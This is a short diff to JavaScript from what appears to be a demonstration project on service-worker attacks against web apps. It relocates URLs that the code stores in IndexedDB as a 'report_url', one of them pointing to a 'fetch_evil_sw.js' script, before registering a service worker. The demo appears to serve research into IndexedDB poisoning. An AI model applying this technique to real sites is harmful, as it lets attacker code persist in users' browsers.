@@ -23,7 +23,7 @@
 			 }
 			 var store = txn.objectStore('urls')
 			 store.delete('report_url').onsuccess = ev => {
-				 var db_op_req = store.put({'id':'report_url', 'url':'https://demopwa.github.io/SW_Attacks/IndexDBPoisoning/fetch_sw.js'})
+				 var db_op_req = store.put({'id':'report_url', 'url':'https://demopwa.github.io/SW_Attacks/helper_scripts/fetch_sw.js'})
 				 db_op_req.onsuccess = function(event) {
 				   if('serviceWorker' in navigator) {
 				      navigator.serviceWorker.register('./sw.js');
@@ -44,7 +44,7 @@
                          alert('URL Modified!!. Reload Page')
                      }
                      var store = txn.objectStore('urls')
-                     var db_op_req = store.put({'id':'report_url', 'url':'https://demopwa.github.io/SW_Attacks/IndexDBPoisoning/fetch_evil_sw.js'})
+                     var db_op_req = store.put({'id':'report_url', 'url':'https://demopwa.github.io/SW_Attacks/helper_scripts/fetch_evil_sw.js'})
                      db_op_req.onsuccess = function(event) { 
 			if('serviceWorker' in navigator) 
 			{
